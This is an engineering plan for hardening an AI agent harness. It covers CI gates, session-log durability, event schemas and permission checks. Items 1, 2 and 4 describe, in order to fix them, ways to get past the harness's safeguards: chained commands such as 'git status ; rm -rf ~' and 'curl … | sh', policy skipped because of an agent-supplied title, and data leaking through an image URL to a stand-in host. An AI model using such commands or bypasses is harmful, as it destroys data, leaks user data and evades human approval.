# Architecture hardening

Status: done, 2026-11-10 (see Outcome). Works in `crates/harness-core`, `crates/harness-tauri`, `packages/api`, `packages/frontend-chat`, `scripts/`, `.github/workflows/`.

## Goal

A more solid base, on architecture alone. No new user features. Every item below is a fix to something that exists, a guarantee we claim in an ADR but don't yet keep, or a quality gate we lack.

## Where we stand

The parts that are hardest to change later are in good shape: a core with no Tauri dependency and one Command/Event API, an append-only Session Log with a pure reducer, specta-generated TS types, the official `agent-client-protocol` and `rmcp` crates, and a managed, hash-pinned toolchain.

The gaps are discipline and follow-through: CI runs only tests (no clippy, fmt, `cargo deny`, Linux, or `harness-tauri`), the Rust test suite is thin (128 tests), Agent upgrades are not verified before use, and command rules match strings instead of parsed commands. We also have three confirmed bugs (P0 below) and two ADR promises we don't keep (Session Log fan-out, ADR 0012 "one truth for all Frontends").

The plan: fix the bugs, add the gates, then make the Session Log and the Event contract as good as the ADRs say they are.

## P0: correctness and safety (do first)

### 1. Execute rules can be bypassed by chaining

- Problem: `pattern_matches` accepts any command that starts with the pattern plus whitespace (`permissions.rs:141-145`). "Always allow `git status`" also allows `git status ; rm -rf ~`, `git status && curl … | sh`, `git status $(…)`.
- Fix: parse the command into simple commands (split on `;`, `&&`, `||`, `|`, newlines, resolve quotes). Fail closed: any substitution, redirect to a file, subshell, backgrounding, variable expansion or `sh -c` means no rule matches, so it asks. A rule matches only when every simple command matches. Keep the Codex `["bash","-lc",…]` unwrap, but in `agent_quirks.rs` (see 11).
- Done when: a table test with at least 30 bypass attempts asks for all of them.

### 2. Policy is skipped based on an Agent-supplied title

- Problem: any permission request whose title starts with `mcp__harness__` or `mcp.harness.` is allowed with no Policy check (`acp.rs:1207-1212`, `mcp.rs:9-11`). The title comes from the Agent's adapter, so it is untrusted input deciding a security check.
- Fix: identify a Harness MCP call by data the Harness owns, not by the title: either correlate with an in-flight request on the Harness MCP for that Agent Session (token + tool name), or simply run the Policy with kind `frontend_tool`/`git_*` (already default-allowed where safe). The double prompt this avoids is a UX cost, not a reason to trust a string.
- Done when: a fake-agent test sends a request titled `mcp__harness__x` for an `execute` tool call and it asks.

### 3. One bad line erases the rest of a Session Log

- Problem: `SessionLog::open` stops at the first line that fails to parse and then `set_len`s the file to that point (`log.rs:93-107`). It is meant for a torn final line, but it also fires on any complete line that doesn't parse. `EventKind` has no catch-all variant (`api.rs:916-918`), so opening a log written by a newer build (one new Event kind), or after we rename or remove a variant, deletes all history after the first such Event. `read_events` instead fails outright on the same line (`log.rs:249`), so the two paths disagree.
- Fix: truncate only a final line with no trailing newline. For a complete line that doesn't parse: copy the file to `log.jsonl.corrupt-<ts>`, keep the line, and read it as `EventKind::Unknown` (`#[serde(other)]`). An Event with `v > EVENT_SCHEMA_VERSION` opens the Session read-only with a clear error. Never rewrite user history.
- Done when: tests cover a mid-file garbage line, an unknown `type`, and a future `v`, and none lose bytes.

### 4. Html frames can send data out through image URLs

- Problem: the frame CSP allows `img-src data: https:` (`harness-tauri/src/lib.rs:264`, `htmlBridge.ts:8`). `connect-src 'none'` stops fetch, but `new Image().src = "https://x/?d=…"` still leaks whatever the frame was given.
- Fix: `img-src data: blob:` by default. If remote images are needed, allow them through the `harness-frame` scheme with an explicit per-render opt-in that the permission prompt shows.
- Done when: a test asserts the CSP string, and ADR 0013/0016 state the network rule precisely.

## P0: quality gates (one PR, cheap)

### 5. CI and hooks

- Add to `.github/workflows/ci.yml`: `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace` (today only `-p harness-core`; `harness-tauri` has 0 tests and is never compiled in CI outside release), `cargo deny check` (licenses, advisories, duplicate versions).
- Generated files: `bun run gen-ts && git diff --exit-code packages/api/src/generated.ts`. Today a stale `generated.ts` passes CI.
- `[workspace.lints]`: `unsafe_code = "forbid"` in `harness-core` (allow in `harness-tauri` for `objc2` only), `clippy::unwrap_used = "warn"` outside tests.
- A Linux job that builds and tests `harness-core` only. The core claims to be UI-agnostic (ADR 0001); CI should prove it is platform-agnostic too, which keeps a Linux build and a headless/server host possible later. Note `keyring` uses only `apple-native` (`harness-core/Cargo.toml`), so secrets need a cfg-gated backend first.
- lefthook: add `cargo fmt` on staged `.rs` files.

## P1: the Session Log as a real event store

The append-only Session Log is the core of the design (ADR 0003): it gives replay, many Views and crash safety that per-Session snapshots can't. Today it is a correct but naive file: everything that needs history re-reads and re-parses the whole file.

### 6. Read from memory, not from disk

- Problem: `SessionLog::events()` reads and parses the whole file, and it is called from 13 places, including every permission Ask (`acp.rs:1300`), turn summaries (`session.rs:800`), transcripts (`transcript.rs:57,124`), context (`harness_context.rs:40`) and config sync (`acp.rs:457,512,558,623,671`). `subscribe` re-reads the whole file too (`log.rs:192`). Cost grows with every Turn.
- Fix: load once on open into an in-memory `Vec<Arc<Event>>` (or a byte-offset index plus an LRU for very long logs). Add small typed projections updated on append (current mode per Thread, title, last finished Turn, transcript size, open tool calls) so hot paths are O(1). `events()` becomes a slice clone, and most callers switch to a projection.
- Done when: a bench (there is already `reducer.bench.test.ts` on the TS side; add one in Rust) shows a permission Ask on a 50k-event log costs the same as on an empty one.

### 7. Don't let a slow View stall the Agent

- Problem: subscribers run inside the log mutex (`log.rs:50`, `141-177`), and `subscribe` replays the full history while holding it (`log.rs:188-201`). Opening a big Session in a new window blocks every append, so the Agent's stream stalls. `v1.md:69` describes a bounded queue with `Lagged`, which was never built.
- Fix: one writer per log; each subscriber gets a bounded channel. Replay happens from the in-memory events outside the lock: capture `seq`, replay up to it, then switch to the live channel (the gap is closed by seq, not by the lock). On overflow, send `Lagged { last_seq }` and drop the subscriber; the View resubscribes from `last_seq`.
- Done when: a test with a sink that sleeps 1 s per Event shows appends still finish in under 1 ms, and the View catches up without gaps or duplicates.

### 8. Startup without parsing every log

- Problem: at launch `Harness::new` opens every Session (`host.rs:83-97`), and `SessionLog::open` parses every line of every log to find `next_seq`, `last_ts_ms` and the last process state (`log.rs:80-107`). Launch time grows with total history.
- Fix: checkpoint `{next_seq, last_ts_ms, agent_was_running, byte_len}` in `session.json` on `sync()`. On open, trust the checkpoint when the file length matches and parse only the tail after `byte_len`. Load full events lazily on first subscribe or `events()`.
- Decide ADR 0010: the SQLite catalog was never built (`v1.md:141`). Either build it now, or amend the ADR to "`session.json` is the catalog and checkpoint". Recommend amending: the per-Session JSON is fine to thousands of Sessions and avoids a second store to keep consistent.

### 9. Durability and single-writer

- `write_meta` renames without `fsync` on the file or the directory (`session.rs:965-970`), so a power loss can leave an empty `session.json`. Add `sync_all` on the temp file and the parent dir. Same for the policy and settings files.
- Two Harness processes on one data dir are only defended by append mode (`log.rs:108-110`, and a test for it). Take an exclusive `flock` on `~/.harness/.lock` at startup and refuse to start a second writer (dev and release already use different dirs).
- Log I/O is blocking `std::fs` on the tokio runtime (only 3 `spawn_blocking` in the core). With item 7's dedicated writer this moves off the async threads.

### 10. Event schema evolution

- Problem: `EVENT_SCHEMA_VERSION` is 1 with no migration path (`api.rs:914`). The log is forever, so every Event kind we ship is a format we must read forever.
- Fix: write an ADR: Event changes are additive only (new kinds, new optional fields); renames and removals go through an upcaster keyed on `v` that runs on read; `Unknown` (item 3) covers newer kinds. Keep golden logs: one recorded log per release in `crates/harness-core/tests/golden/` (start from `packages/frontend-chat/src/fixtures/codex-basic.jsonl`), replayed in CI through both the Rust parser and the TS reducer.
- Done when: CI fails if a change makes any golden log unreadable or changes its reduced chat state.

## P1: one truth for every Frontend (ADR 0012)

### 11. Agent knowledge leaks into the Frontend and the core

- Problem: the chat Frontend reads agent-specific shapes out of raw ACP payloads: the plan from `rawInput.plan` on `switch_mode` (`reducer.ts:214-217`), the subagent prompt from Claude's Task `rawInput.prompt` (`SubagentCard.tsx:15`), the Frontend Tool name by regex on the core's title text `Frontend tool: <name>` (`reducer.ts:741`), git tool summaries from raw input and output (`toolDisplay/label.ts:39`). A second Frontend would have to copy all of it, which ADR 0012 says should not happen. The log itself stores ACP payloads untyped (`content`, `locations`, `raw_input`, `raw_output`, `tool_call`, `update` as `Json`, `api.rs:1002-1139`), so the Event schema is partly ACP's schema.
- Problem, core side: agent-specific handling outside `agent_quirks.rs`, against AGENTS.md and ADR 0008: Codex `bash -lc` unwrapping in `permissions.rs:173-177`, Harness MCP tool naming per Agent in `mcp.rs:9-11` and `acp.rs:1209`.
- Fix: normalize in the core (`acp.rs normalize` plus `agent_quirks.rs`) into typed Event fields: `ToolCall.plan`, `ToolCall.subagent { prompt, thread }`, `ToolCall.harness_tool`, `ToolCall.command` (already unwrapped), a typed `ToolContent` enum. Keep `raw_*` for the Inspector only. Move every agent-name check into `agent_quirks.rs`.
- Guard: a CI grep that fails when `claude`, `codex`, `mcp__` or `rawInput.` appear in `packages/frontend-*` (outside tests and fixtures) or agent names appear in core files other than `agent_quirks.rs`.

### 12. Typed errors across the boundary

- Problem: `execute` returns `Result<CommandResult, String>` (`harness-tauri/src/lib.rs:95-98`). Frontends can't tell auth-required from not-found from conflict except by matching text.
- Fix: `HarnessError { code: ErrorCode, message, details }` with `ErrorCode` a specta-exported enum (`AuthRequired`, `NotFound`, `Conflict`, `PolicyDenied`, `AgentUnavailable`, `Invalid`, `Internal`). `anyhow` stays inside the core and is mapped at the edge.

### 13. Tighter Frontend boundary

- `scripts/check-boundaries.ts:5` only forbids `@tauri-apps/*`, `@harness/app` and other Frontends. Switch to an allowlist: `@harness/api`, `@harness/ui`, `react`, and the deps the package declares. That keeps Frontends portable to another host.

## P1: concurrency and module hygiene

### 14. Lock poisoning

- About 110 `lock().unwrap()` on `std::sync::Mutex` in the core and adapter. One panic while holding a lock poisons it, and every later `unwrap` panics too, so one bug takes down every Session. Switch to `parking_lot` (no poisoning, smaller, faster), or a `lock()` helper that recovers. With item 5's `unwrap_used` lint, the remaining ~50 non-lock unwraps get a reason or a `?`.

### 15. Split the god modules

- `acp.rs` (1377 lines, 35 functions) mixes process lifecycle, restore and fork, permission evaluation and update normalization. Split into `acp/process.rs` (AgentSlot, spawn, watchdog, exit), `acp/restore.rs` (resume, load, continue with summary, fork), `acp/permission.rs` (authorize, remembered rules), `acp/normalize.rs` (pure, unit-tested against recorded ACP fixtures from real Claude and Codex runs).
- `RenderUi.tsx` (2019) and `tools.ts` (1901): one file per component group with its spec, schema and renderer side by side, so adding a component touches one file.
- Small duplication to fold into `@harness/ui` or `@harness/api`: `errText` (4 copies), `baseName` (3, with different semantics), `clamp` (3).

## P2: supply chain and Agent versions

### 16. Verified installs, verified upgrades

- The registry index is fetched with no integrity check (`agents.rs:184-186`), and a binary archive is verified only if the registry happens to list a sha256 (`agents.rs:247-252`).
- Fix: refuse binary installs without a sha256 (or require an explicit "install unverified" confirm). Record the installed artifact's hash and version in the Agent record. Make installs transactional: install the new version side by side, run a headless conformance check (spawn, `initialize`, `session/new` against a temp folder, a no-op prompt with the fake MCP), switch only if it passes, keep the previous version for one-click rollback, and let the user hold an Agent at a version.
- CI: a nightly job that runs that conformance check for the current registry versions of Claude and Codex, so a broken adapter release is seen before users see it.

## P2: tests that prove the guarantees

- Session Log property tests: random appends, crash at a random byte, reopen; the result is always a prefix of what was written, and `seq` is contiguous.
- Fake-agent fault injection: agent crash mid-Turn, malformed JSON-RPC, a response that never comes, a 10 MB tool output, a permission request after cancel. `crates/fake-agent` already scripts ACP, so these are new scripts, not new infra.
- Golden-log replay (item 10) and the permission bypass table (item 1).
- `harness-tauri`: at least the scheme handler (`harness-frame` path checks, CSP) and the IPC subscription lifecycle.

## Order

1. Week 1: items 1 to 5 (bugs and gates). Small, independent, high value.
2. Week 2 to 3: items 6 to 10 (Session Log). Do 3 and 10 first, since they define the format the rest builds on.
3. Week 3 to 4: items 11 to 13 (Event contract), then 14 and 15.
4. Later: 16 and the P2 tests.

New ADRs: event schema evolution (10), log storage and fan-out (6, 7, 8, replacing or amending 0010), typed errors (12).

## Scorecard: done means

|                                 | Today                                    | Target                                               |
| ------------------------------- | ---------------------------------------- | ---------------------------------------------------- |
| Rust gates in CI                | tests only                               | fmt, clippy -D, deny, forbid unsafe, workspace tests |
| Platforms in CI                 | macOS                                    | macOS + Linux (core)                                 |
| Known security bugs             | 3 (items 1, 2, 4)                        | 0                                                    |
| Data-loss paths in persistence  | truncation on bad line, no fsync on meta | none known                                           |
| History cost per permission Ask | O(log size) from disk                    | O(1)                                                 |
| Frontend reads raw agent shapes | yes                                      | no, CI-enforced                                      |
| Rust↔TS types                   | generated, unchecked in CI               | generated, checked                                   |
| Agent upgrades                  | install and switch                       | verified, with rollback and hold                     |

## Decisions

- ADR 0010 SQLite catalog: amended, `session.json` is the catalog plus `log.checkpoint.json` (ADR 0021).
- Html frames: no network at all; images only from `data:`/`blob:`.
- Linux: CI builds and tests the core only.
- `parking_lot` for all core and adapter locks.
- `raw_*` stay in Events for the Inspector and the raw JSON view; Frontend logic may not read them (guard script).

## Outcome

All items landed with tests. Found and fixed on the way: a Turn's end was visible before the Session left Working; a new tool call reusing an id kept the old call's `kind`; Cancel never ended a Turn whose Agent hung; a permission request after Cancel stayed pending; an advisory in `rmcp` (RUSTSEC-2026-0462); an import cycle that made the render_ui catalog pull in renderers.

Left for later:

- The ACP Registry index itself is fetched without an integrity check; npx/uvx installs record no artifact hash.
- `normalize` tests use hand-written ACP JSON, not recordings of real Agent runs.
- No property tests for the Session Log yet (crash and torn-line cases are covered by example tests).
- Tauri commands other than `execute` still return string errors.
